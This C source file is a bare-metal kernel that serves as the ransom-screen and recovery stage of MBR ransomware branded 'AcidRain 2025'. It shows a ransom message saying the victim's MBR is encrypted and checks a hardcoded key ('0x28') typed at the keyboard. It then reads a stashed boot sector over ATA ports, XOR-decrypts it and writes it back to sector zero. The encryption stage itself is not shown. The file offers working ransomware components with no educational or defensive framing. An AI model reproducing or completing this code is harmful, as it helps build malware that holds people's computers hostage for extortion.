//
// Bare metal kernel written in C. 
//

#include <stdint.h>

 //unsigned char      uint8_t;
 //unsigned short     uint16_t;
 //unsigned int       uint32_t;

enum color
{
	VGA_COLOR_BLACK = 0,
	VGA_COLOR_BLUE = 1,
	VGA_COLOR_GREEN = 2,
	VGA_COLOR_CYAN = 3,
	VGA_COLOR_RED = 4,
	VGA_COLOR_MAGENTA = 5,
	VGA_COLOR_BROWN = 6,
	VGA_COLOR_LIGHT_GREY = 7,
	VGA_COLOR_DARK_GREY = 8,
	VGA_COLOR_LIGHT_BLUE = 9,
	VGA_COLOR_LIGHT_GREEN = 10,
	VGA_COLOR_LIGHT_CYAN = 11,
	VGA_COLOR_LIGHT_RED = 12,
	VGA_COLOR_LIGHT_MAGENTA = 13,
	VGA_COLOR_LIGHT_BROWN = 14, //yellow
	VGA_COLOR_WHITE = 15,
};


#define VGA_WIDTH 80
#define VGA_HEIGHT 25

#define KBD_DATA_PORT 0x60 // Keyboard data port
#define KBD_STATUS_PORT 0x64 // Keyboard status port

#define VGA_IO_PORT    0x3D4  // VGA register port
#define VGA_IO_DATA    0x3D5  // VGA data port


#define ATA_DATA         0x1F0  // Data Port (R/W 16-bit)
#define ATA_ERROR        0x1F1  // Error Register (R) / Features (W)
#define ATA_SECTOR_COUNT 0x1F2  // Number of sectors to transfer
#define ATA_LBA_LOW      0x1F3  // LBA low byte
#define ATA_LBA_MID      0x1F4  // LBA mid byte
#define ATA_LBA_HIGH     0x1F5  // LBA high byte
#define ATA_DRIVE		 0x1F6  // Drive & Head Select
#define ATA_COMMAND      0x1F7  // Command Register (W) / Status Register (R)
#define ATA_STATUS       0x1F7  // Status (R) / Command (W)
#define ATA_ALT_STATUS   0x3F6  // Alternate Status (R) / Device Control (W)

// ATA Commands
#define ATA_CMD_READ     0x20  // Read Sectors
#define ATA_CMD_WRITE    0x30  // Write Sectors
#define ATA_CMD_FLUSH    0xE7  // Flush Cache


const char* videoMemoryPtr = (char*)0xb8000;


char scancodeMapping[128] =
{
	0,  27, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\b',
  '\t', /* <-- Tab */
  'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
	0, /* <-- control key */
  'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`',  0, '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/',   0,
  '*',
	0,  /* Alt */
  ' ',  /* Space bar */
	0,  /* Caps lock */
	0,  /* 59 - F1 key ... > */
	0,   0,   0,   0,   0,   0,   0,   0,
	0,  /* < ... F10 */
	0,  /* 69 - Num lock*/
	0,  /* Scroll Lock */
	0,  /* Home key */
	0,  /* Up Arrow */
	0,  /* Page Up */
  '-',
	0,  /* Left Arrow */
	0,
	0,  /* Right Arrow */
  '+',
	0,  /* 79 - End key*/
	0,  /* Down Arrow */
	0,  /* Page Down */
	0,  /* Insert Key */
	0,  /* Delete Key */
	0,   0,   0,
	0,  /* F11 Key */
	0,  /* F12 Key */
	0,  /* All other keys are undefined */
};



void ClearScreen(enum color color);
void Print(const char* string, int x, int y, enum color color);
void Sleep(uint32_t cycles);
uint8_t inb(uint16_t port);
uint16_t inw(uint16_t port);
void outb(uint16_t port, uint8_t data);
void outw(uint16_t port, uint16_t data);
void SetCursorPos(int x, int y);
void itoa(int num, char* str);
uint8_t GetScanCode();
uint8_t GetKeyPress();

void byteToHexStr(uint8_t byte, char* str);


void Stage1(int col);
void Stage2();
void Stage3();

void DecryptMBR();



void _start()
{
	ClearScreen(VGA_COLOR_BLACK);
	
	//Sleep(150000000);

	while (inb(KBD_STATUS_PORT) & 0x01) //Empty keyboard status port
	{
		inb(KBD_DATA_PORT);
	}


	while(1)
	{

		Stage1(1);
		Sleep(80000000);
		Stage1(2);
		Sleep(80000000);


		if (inb(KBD_STATUS_PORT) & 0x01) // if bit 0 is set, data is available 
		{
			//uint8_t scancode = inb(KBD_DATA_PORT);
			break;
		
		}
	}
	

	Stage2();



	while (1)
	{

	}
}

// Simple I/O port read function (byte)
uint8_t inb(uint16_t port)
{
	uint8_t data;
	__asm__ volatile("inb %1, %0" : "=a"(data) : "Nd"(port));
	return data;
}

// Simple I/O port write function (byte)
void outb(uint16_t port, uint8_t data)
{
	__asm__ volatile("outb %0, %1" : : "a"(data), "Nd"(port));
}

// Simple I/O port write function (word)
uint16_t inw(uint16_t port) 
{
	uint16_t data;
	asm volatile ("inw %1, %0" : "=a"(data) : "Nd"(port));
	return data;
}

// Simple I/O port write function (word)
void outw(uint16_t port, uint16_t data)
{
	__asm__ volatile("outw %0, %1" : : "a"(data), "Nd"(port));
}

void Print(const char* string, int x, int y, enum color color)
{
	char* addr = videoMemoryPtr + 2 * (80 * y + x);

	for (int i = 0; string[i] != '\0'; i++)
	{
		*addr = string[i];
		addr++;
		*addr = (char)color;
		addr++;
	}
}

void ClearScreen(enum color color)
{
	char* addr = videoMemoryPtr;

	for (int i = 0; i < VGA_WIDTH * VGA_HEIGHT; i++)
	{
		*addr = ' ';
		addr++;
		*addr = (char)color;
		addr++;
	}
}


void Sleep(uint32_t cycles) 
{
	while (cycles--) 
	{
		__asm__ volatile ("nop");
	}
}

void SetCursorPos(int x, int y)
{

	int position = y * 80 + x;


	outb(VGA_IO_PORT, 0x0E);  // Select the high byte register (0x0E)
	outb(VGA_IO_DATA, (uint8_t)(position >> 8)); // Write the high byte of position

	outb(VGA_IO_PORT, 0x0F);  // Select the low byte register (0x0F)
	outb(VGA_IO_DATA, (uint8_t)(position & 0xFF)); // Write the low byte of position
}


void itoa(int num, char* str) 
{
	int i = 0;
	int isNegative = 0;

	// Handle 0 explicitly, otherwise empty string is printed
	if (num == 0) {
		str[i++] = '0';
		str[i] = '\0';
		return;
	}

	// Handle negative numbers
	if (num < 0) {
		isNegative = 1;
		num = -num;  // Make num positive
	}

	// Process individual digits
	while (num != 0) {
		str[i++] = (num % 10) + '0';  // Get the next digit
		num = num / 10;  // Reduce num
	}

	// Append negative sign for negative numbers
	if (isNegative) {
		str[i++] = '-';
	}

	str[i] = '\0';  // Null-terminate the string

	// Reverse the string as we've processed digits in reverse order
	int start = 0;
	int end = i - 1;
	while (start < end) {
		char temp = str[start];
		str[start] = str[end];
		str[end] = temp;
		start++;
		end--;
	}
}


void byteToHexStr(uint8_t byte, char* str) 
{
	const char hexChars[] = "0123456789ABCDEF";  // Hexadecimal characters
	str[0] = hexChars[(byte >> 4) & 0x0F];      // Upper nibble
	str[1] = hexChars[byte & 0x0F];             // Lower nibble
	str[2] = '\0';  // Null-terminate the string
}


//Gets the scancode of the key pressed
// Function to get a key press
uint8_t GetScanCode()
{
	// Wait for a new key press
	while (!(inb(KBD_STATUS_PORT) & 1));

	uint8_t scancode = inb(KBD_DATA_PORT);

	// Ignore key releases (scancode >= 0x80)
	if (scancode & 0x80)
		return 0;

	return scancode;  // Return the actual keypress scancode
}

// Convert scancode to ASCII and return the character
uint8_t GetKeyPress()
{
	uint8_t scancode;

	// Keep checking until a valid keypress is found
	while ((scancode = GetScanCode()) == 0);

	return scancodeMapping[scancode];
}

uint8_t AsciiToScancode(uint8_t keypress)
{
	
	return scancodeMapping[keypress];

}


void Stage1(int col)
{

	const char* art[] = {
		"                   ...=%@@@@@@%+...                   ",
		"                .-%%*------------*%@-.                ",
		"              :%#=------------------=#%:              ",
		"            .##--=%%--------------%%+--#%.            ",
		"           -@=-=@@@@@------------%@@@@=-=@=           ",
		"          +%--%@@@@@@@=--------=@@@@@@@%--%*          ",
		"         -%--%@@@@@@@@@--------@@@@@@@@@%--%-         ",
		"        .@=-#@@@@@@@@@@@=----=@@@@@@@@@@@%-=@:        ",
		"        -%-=@@@@@@@@@@@+-*@@*-=@@@@@@@@@@@=-%=        ",
		"        +*-=@@@@@@@@@@*=@@@@@@=+@@@@@@@@@@+-*+        ",
		"        +*-------------=@@@@@@=-------------**        ",
		"        -%---------------*@@*---------------%=        ",
		"        .@=-------------%%##%%-------------=@:        ",
		"         -%------------@@@@@@@@------------%-         ",
		"          *%----------%@@@@@@@@%----------#*          ",
		"           =@=-------@@@@@@@@@@@@=-------@=           ",
		"            .%#----=@@@@@@@@@@@@@@=----*%.            ",
		"              :%#=--=#@@@@@@@@@@#=--=#%:              ",
		"                .-@%*------------+%@=.                ",
		"                   ..:+%@@@@@@%+:..                   "
	};


	int position = 24 * 80 + 5;



	if (col == 1) //black bg
	{

		ClearScreen(VGA_COLOR_BROWN | VGA_COLOR_BLACK << 4);

		Print("AcidRain 2025", 33, 0, VGA_COLOR_BROWN | VGA_COLOR_BLACK << 4);

		int j = 2;
		for (int i = 0; i < 20; i++)
		{
			Print(art[i], 13, j, VGA_COLOR_BROWN | VGA_COLOR_BLACK << 4);
			j++;
		}

		Print("Press any key...", 31, 23, VGA_COLOR_BROWN | VGA_COLOR_BLACK << 4);



		SetCursorPos(0, 25);

	}
	else if(col == 2) //brown bg
	{
		
		ClearScreen(VGA_COLOR_BLACK | VGA_COLOR_BROWN << 4);


		Print("AcidRain 2025", 33, 0, VGA_COLOR_BLACK | VGA_COLOR_BROWN << 4);

		int j = 2;
		for (int i = 0; i < 20; i++)
		{
			Print(art[i], 13, j, VGA_COLOR_BLACK | VGA_COLOR_BROWN << 4);
			j++;
		}

		Print("Press any key...", 31, 23, VGA_COLOR_BLACK | VGA_COLOR_BROWN << 4);

		SetCursorPos(0, 25);

	}

}


void Stage2()
{
	ClearScreen(VGA_COLOR_BROWN | VGA_COLOR_BLACK << 4);

	char* addr = videoMemoryPtr + 2 * (80 * 1 + 0);


	Print("Your computer has been taken over by AcidRain ransomware!", 0, 0, VGA_COLOR_BROWN);
	
	for (int i = 0; i < VGA_WIDTH; i++)
	{
		*addr = ' ';
		addr++;
		*addr = VGA_COLOR_LIGHT_GREY | VGA_COLOR_LIGHT_GREY << 4;
		addr++;
	}


	Print("Your MRB has been encrypted. In order to restore it, follow the steps below!", 0, 2, VGA_COLOR_BROWN);
	Print("1. Enter your decryption key below", 0, 4, VGA_COLOR_BROWN);

	Print("Key:", 0, 24, VGA_COLOR_BROWN);

	int cursorPosX = 4;

	SetCursorPos(cursorPosX, 24);

	char keyBuffer[256] = {0};
	int charCount = 0;

	

	//Sleep(100000000);

	while (1) // Scancode for the Enter key
	{

		uint8_t keyPressed = GetKeyPress();


		if (charCount == 0 && keyPressed == 0x0A)
		{
			continue;
		}

		if (keyPressed == 0x20)
		{
			continue;
		}

		if (keyPressed && keyPressed != 0x0A)
		{

			keyBuffer[charCount] = keyPressed;
			charCount++;
			keyBuffer[charCount] = '\0';

			Print(keyBuffer, cursorPosX, 24, VGA_COLOR_BROWN);
			SetCursorPos(cursorPosX + charCount, 24);

		}
		else
		{

			if (keyBuffer[0] == '0' && keyBuffer[1] == 'x' && keyBuffer[2] == '2' && keyBuffer[3] == '8')
			{
				Print("Correct key!", cursorPosX + charCount + 2, 24, VGA_COLOR_BROWN);

				for (int i = 0; i < 15; i++)
				{
					Print(" ", 0 + i, 23, VGA_COLOR_BROWN);
				}

				Stage3();
				return;
			}
			else
			{
				Print("Incorrect key!", 0, 23, VGA_COLOR_BROWN);

				for (int i = 0; i < 21; i++)
				{
					Print(" ", 4 + i, 24, VGA_COLOR_BROWN);
				}

				for (int i = 0; i < sizeof(keyBuffer); i++)
				{
					keyBuffer[i] = 0;
				}

				cursorPosX = 4;
				charCount = 0;

				SetCursorPos(cursorPosX + charCount, 24);

				continue;
			}

		}
	}
}


void Stage3()
{
	char* addr = videoMemoryPtr;

	for (int i = 0; i < VGA_WIDTH * VGA_HEIGHT; i++)
	{
		*addr = ' ';
		addr++;
		*addr = VGA_COLOR_LIGHT_GREY | VGA_COLOR_LIGHT_GREY << 4;
		addr++;
	}

	DecryptMBR();


	for (int i = 0; i < VGA_WIDTH * VGA_HEIGHT; i++)
	{
		*addr = ' ';
		addr++;
		*addr = VGA_COLOR_LIGHT_GREY | VGA_COLOR_LIGHT_GREY << 4;
		addr++;
	}


	Print("Please reboot your computer!", 0, 10, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);

	return;

}




void DecryptMBR()
{

	uint8_t buffer[512] = {0};

	//master drive
	outb(ATA_DRIVE, 0xE0);

	//only 1 sector needs to be read
	outb(ATA_SECTOR_COUNT, 1);

	// Send LBA address (28-bit)
	outb(ATA_LBA_LOW, 18 & 0xFF);
	outb(ATA_LBA_MID, (18 >> 8) & 0xFF);
	outb(ATA_LBA_HIGH, (18 >> 16) & 0xFF);

	//send read command
	outb(ATA_COMMAND, ATA_CMD_READ);

	//wait for disk to finish
	while (inb(ATA_STATUS) & 0x80);
	while (!(inb(ATA_STATUS) & 0x08));


	uint16_t* buf16 = (uint16_t*)buffer; //data in ATA_DATA is in word size, not byte

	for (int i = 0; i < 512; i += 2)
	{
		Print("Reading sector: ", 0, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);


		char str[10];

		itoa(i, str);

		Print(str, 16, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);


		Print("/ 512", 20, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);


		if (i == 510)
		{
			Print("512 / 512 Done!", 16, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
		}

		Sleep(9000000);

		uint16_t data = inw(ATA_DATA);
		
		buffer[i] = (uint8_t)(data & 0xFF);				// Lower byte
		buffer[i + 1] = (uint8_t)((data >> 8) & 0xFF);  // Upper byte

	}



	uint8_t lastByte = (uint8_t)(buffer[511]);

	if ((lastByte ^ 0x28) == 0xAA)
	{
		Print("Bootloader found", 0, 5, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);

		for (int i = 0; i < 512; i++)
		{
			uint8_t byte = buffer[i];
			byte = byte ^ 0x28;
			buffer[i] = byte;

			Print("Decrypting sector: ", 0, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);


			char str[10];

			itoa(i, str);

			Print(str, 16, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);


			Print("/ 512", 20, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);

			if (i == 510)
			{
				Print("512 / 512 Done!", 16, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
			}

		}
		
		
		//master drive
		outb(ATA_DRIVE, 0xE0);

		//only 1 sector needs to be written
		outb(ATA_SECTOR_COUNT, 1);

		// Send LBA address (28-bit)
		outb(ATA_LBA_LOW, 0 & 0xFF);
		outb(ATA_LBA_MID, (0 >> 8) & 0xFF);
		outb(ATA_LBA_HIGH, (0 >> 16) & 0xFF);

		//send write command
		outb(ATA_COMMAND, ATA_CMD_WRITE);
		
		while (inb(ATA_STATUS) & 0x80);  // Wait for busy flag to clear
		while (!(inb(ATA_STATUS) & 0x40));  // Wait for ready flag


		uint16_t* buf16 = (uint16_t*)buffer;
		for (int i = 0; i < 256; i++) 
		{
			outw(ATA_DATA, buf16[i]);  // Write word (2 bytes) to ATA data register
		}


		outb(ATA_COMMAND, 0xE7); //cache flush

		return;

	}
	else
	{
		Print("MBR error", 0, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
	}


	return;

}